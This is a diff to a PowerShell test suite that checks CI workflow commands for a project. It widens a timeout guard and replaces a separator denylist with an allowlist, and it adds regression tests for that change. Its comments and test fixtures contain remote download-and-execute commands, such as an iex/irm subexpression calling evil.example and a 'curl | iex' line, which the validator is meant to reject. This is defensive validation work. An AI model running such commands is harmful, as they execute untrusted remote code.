@@ -74,7 +74,7 @@ $script:Passes = 0
 # DECLARED, never counted from the cases that happened to run: a count taken
 # from what ran cannot notice that nothing did. Keep it in step with the cases
 # below -- a mismatch either way fails the run.
-$ExpectedCaseCount = 81
+$ExpectedCaseCount = 83
 
 # What the two cases that plant a package built to HANG give the sweep before
 # they expect it to give up, and how long this suite then waits for any case.
@@ -663,12 +663,18 @@ function Get-JobTimeoutMinute {
 }
 
 # The timeout-minutes values declared on steps whose own run: line invokes
-# test.ps1 or format.ps1 -- $OdinSweepTimeoutSeconds bounds both sweeps
-# (scripts\common.ps1, scripts\format.ps1:36), so both are the guard's
-# business, and a step whose run: does neither runs no sweep at all, so a
-# short timeout there is a developer's own choice (issue #135, parked from
-# #83: the pre-#135 version read every timeout-minutes in the file and
-# refused a 5-minute timeout on the odinfmt install for exactly this reason).
+# test.ps1, format.ps1 or build.ps1 -- $OdinSweepTimeoutSeconds bounds all
+# three sweeps (scripts\common.ps1, scripts\format.ps1:36, and build.ps1:52's
+# own call to Assert-OdinFormatting, which takes no -SweepTimeoutSeconds and
+# so falls back to the same $OdinSweepTimeoutSeconds default), so all three
+# are the guard's business, and a step whose run: does none of them runs no
+# sweep at all, so a short timeout there is a developer's own choice (issue
+# #135, parked from #83: the pre-#135 version read every timeout-minutes in
+# the file and refused a 5-minute timeout on the odinfmt install for exactly
+# this reason). Both Build steps were missing here until issue #135 fix round
+# 2, finding 1: a 300-second GitHub step timeout on Build (debug) against
+# build.ps1's own 900-second format sweep was exactly the platform-reported,
+# nothing-named hang this guard exists to prevent.
 #
 # This reads $Text's own step blocks directly rather than filtering
 # $LoadBearingCiSteps by name (issue #135 fix round 1, finding 2): the roster
@@ -682,7 +688,7 @@ function Get-SweepTimeoutMinute {
 
 	$minutes = @()
 	foreach ($block in [regex]::Matches($Text, '(?m)^[ \t]*-[ \t]*name:[ \t]*.+?[ \t]*\r?\n(?:(?![ \t]*-[ \t]*name:)[^\r\n]*\r?\n?)*')) {
-		if ($block.Value -notmatch '(?m)^[ \t]*run:[ \t]*\.\\scripts\\(test|format)\.ps1\b') {
+		if ($block.Value -notmatch '(?m)^[ \t]*run:[ \t]*\.\\scripts\\(test|format|build)\.ps1\b') {
 			continue
 		}
 		$minutes += @([regex]::Matches($block.Value, '(?m)^\s*timeout-minutes:\s*(\d+)') | ForEach-Object { [int] $_.Groups[1].Value })
@@ -717,10 +723,19 @@ function Get-DeclaredSweepTimeoutMinute {
 # else first and an owned script second (`curl ... | iex; .\scripts\test.ps1`),
 # or that never runs the owned script at all and only mentions it after a `#`
 # comment (`echo hi  # .\scripts\test.ps1`), matched the old anywhere-in-line
-# regex and read as owned. A command is owned only when it is nothing BUT the
-# script invocation and its own flags -- any statement-separator character
-# after the script name (`;`, `|`, `&`, `` ` ``, `#`) means something else
-# rides along in the same run: line, so the whole command reads as unowned.
+# regex and read as owned.
+#
+# The rest of the command is checked with an ALLOWLIST of what a flag or
+# argument may look like, not a denylist of separator characters (issue #135
+# fix round 2, finding 2): a five-character denylist (`;`, `|`, `&`, `` ` ``,
+# `#`) never named `(` or `$(`, so a subexpression argument --
+# `.\scripts\test.ps1 -X $(iex(irm https://evil.example/x.ps1))` -- ran
+# arbitrary remote code past it while matching none of the five. The whole
+# command must be nothing but the owned script's path followed by flags,
+# quoted literals and bare words built only from characters a shell never
+# expands; anything else (a subexpression, a variable, a redirect, a brace)
+# fails the allowlist and the whole command reads as unowned, whatever
+# separator character it did or did not use.
 function Get-UnownedCiCommand {
 	param([Parameter(Mandatory)] [AllowEmptyString()] [string] $Text)
 
@@ -729,12 +744,13 @@ function Get-UnownedCiCommand {
 		throw "no .ps1 files under $(Join-Path $RepoRoot 'scripts'), so every ci.yml command would read as unowned."
 	}
 
+	$allowPattern = '^\.\\scripts\\(?<name>[A-Za-z0-9_.-]+\.ps1)\b(?:[ \t]+(?:-[A-Za-z][A-Za-z0-9]*|''[^''\r\n]*''|"[^"\r\n]*"|[A-Za-z0-9_.:\\/-]+))*[ \t]*$'
+
 	$unowned = @()
 	foreach ($match in [regex]::Matches($Text, '(?m)^[ \t]*run:[ \t]*(.+?)[ \t]*\r?$')) {
 		$command = $match.Groups[1].Value
-		$head = [regex]::Match($command, '^\.\\scripts\\([A-Za-z0-9_.-]+\.ps1)\b')
-		$carriesAnotherStatement = $command -match '[;|&`#]'
-		if ((-not $head.Success) -or ($owned -notcontains $head.Groups[1].Value) -or $carriesAnotherStatement) {
+		$whole = [regex]::Match($command, $allowPattern)
+		if ((-not $whole.Success) -or ($owned -notcontains $whole.Groups['name'].Value)) {
 			$unowned += $command
 		}
 	}
@@ -1108,6 +1124,27 @@ Test-Case 'a short timeout on the formatting sweep step binds the budget guard' 
 	}
 }
 
+# Filed from the #147 review (issue #135 fix round 2, finding 1): the guard's
+# filter named 'test' and 'format' but not 'build', though build.ps1:52 calls
+# Assert-OdinFormatting with no -SweepTimeoutSeconds override and so runs the
+# same $OdinSweepTimeoutSeconds-budgeted sweep under Build (debug) and
+# Build (release). A short GitHub step timeout on either was a hang reported
+# by the platform, naming no package.
+Test-Case 'a short timeout on a build ci.yml step binds the budget guard' {
+	$workflow = Join-Path $RepoRoot '.github\workflows\ci.yml'
+	if (-not (Test-Path -LiteralPath $workflow)) {
+		throw "no $workflow to read the load-bearing steps out of."
+	}
+	$text = Get-Content -LiteralPath $workflow -Raw
+	foreach ($name in @('Build (debug)', 'Build (release)')) {
+		$mutated = Add-CiStepTimeout -Text $text -Name $name -Minutes 5
+		$declared = @(Get-DeclaredSweepTimeoutMinute -Text $mutated)
+		if ($declared -notcontains 5) {
+			throw "a 5-minute timeout on '$name', which runs the same budget-bounded format sweep as 'Check formatting', did not reach the budget guard."
+		}
+	}
+}
+
 # Filed from the #104 review (issue #116): this file read ci.yml at exactly
 # one point -- the timeout guard above -- and pinned the existence of no step
 # at all. Deleting Test, Build (debug), Check formatting or the #104
@@ -1218,6 +1255,28 @@ Test-Case 'a command riding alongside an owned scripts\ call is not read as owne
 		$unowned = @(Get-UnownedCiCommand -Text $text)
 		if ($unowned -notcontains $command) {
 			throw "'$command' was not read as unowned, so a command laundered alongside an owned script call would pass the pin."
+		}
+	}
+}
+
+# Filed from the #147 review (issue #135 fix round 2, finding 2): the old
+# check rejected a command carrying any of five separator characters
+# (`;`, `|`, `&`, `` ` ``, `#`) after the owned script's name, but never
+# named `(` or `$(` -- and PowerShell evaluates a subexpression argument
+# before binding it, so an argument built from one runs before the owned
+# script even starts. Both an argument-position subexpression and a bare
+# leading one read as owned under the five-character denylist; neither does
+# under the allowlist that replaced it.
+Test-Case 'a subexpression argument to an owned scripts\ call is not read as owned' {
+	$commands = @(
+		'.\scripts\test.ps1 -X $(iex(irm https://evil.example/x.ps1))'
+		'(iex (irm https://evil.example/x.ps1))'
+	)
+	foreach ($command in $commands) {
+		$text = "      - name: Scratch`r`n        shell: pwsh`r`n        run: $command`r`n"
+		$unowned = @(Get-UnownedCiCommand -Text $text)
+		if ($unowned -notcontains $command) {
+			throw "'$command' was not read as unowned, so a subexpression riding in an owned script's argument would pass the pin."
 		}
 	}
 }
